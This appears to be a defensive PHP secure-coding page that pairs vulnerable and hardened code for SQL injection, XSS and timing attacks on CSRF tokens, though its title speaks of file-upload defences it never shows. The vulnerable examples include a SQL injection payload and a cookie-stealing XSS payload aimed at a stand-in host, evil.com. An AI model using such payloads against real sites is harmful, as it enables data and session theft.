Interactive Secure File Upload Defense Pipeline

Click through each defensive layer of enterprise PHP file upload hardening to see how to prevent remote code execution (RCE) and path traversal attacks:

SQLi Defense: Real Prepared Statements with Emulate Prepares Disabled.

<?php
// ❌ VULNERABLE: Direct string interpolation into SQL query!
$email = $_POST['email']; // Attacker payload: ' OR '1'='1
$sql = "SELECT * FROM users WHERE email = '$email'";
$db->query($sql); // DUMP ENTIRE DATABASE!

// ✅ SECURE: Real PDO Prepared Statements:
$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false, // Critical: Enforces real server-side prepared statements!
];
$pdo = new PDO($dsn, $user, $pass, $options);

// Parameter values are sent in a separate protocol packet from SQL grammar:
$stmt = $pdo->prepare('SELECT id, name, password_hash FROM users WHERE email = :email AND status = :status');
$stmt->execute([
    ':email'  => $_POST['email'],
    ':status' => 'active',
]);
$user = $stmt->fetch();
?>

XSS Defense: htmlspecialchars with ENT_QUOTES and ENT_HTML5.

<?php
// ❌ VULNERABLE: Direct output of user input into HTML
echo "<h1>Welcome, " . $_GET['name'] . "</h1>";
// Attacker sends: ?name=<script>document.location='http://evil.com?c='+document.cookie</script>
// Cookie stolen immediately!

// ✅ SECURE: Universal HTML Escaping Helper
function e(string $value): string {
    return htmlspecialchars($value, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

// In HTML template:
?>
<h1>Welcome, <?= e($_GET['name'] ?? 'Guest') ?></h1>
<!-- Rendered output: &lt;script&gt;alert(1)&lt;/script&gt; (Safe text, NOT executed!) -->
<?php

// For Rich Text (HTML WYSIWYG Editors), use HTMLPurifier:
$purifier = new HTMLPurifier();
$cleanHtml = $purifier->purify($_POST['blog_content']); // Allows <b>, <i>, <p> but strips <script>, onclick
?>

Timing Attack Defense: hash_equals() constant-time comparison.

<?php
// ❌ VULNERABLE: Standard '===' comparison terminates on the FIRST mismatched byte!
if ($_POST['csrf_token'] === $_SESSION['csrf_token']) { ... }
// Attacker measures response time in nanoseconds to guess token character-by-character!

// ✅ SECURE: hash_equals() executes in CONSTANT TIME regardless of match:
function validateCsrf(string $submittedToken): bool {
    $knownToken = $_SESSION['csrf_token'] ?? '';
    
    if (empty($knownToken) || empty($submittedToken)) {
        return false;
    }

    return hash_equals($knownToken, $submittedToken); // Constant execution time!
}

// Generating CSRF Token:
function generateCsrf(): string {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32)); // Cryptographically secure 64-char token
    }
    return $_SESSION['csrf_token'];
}
?>
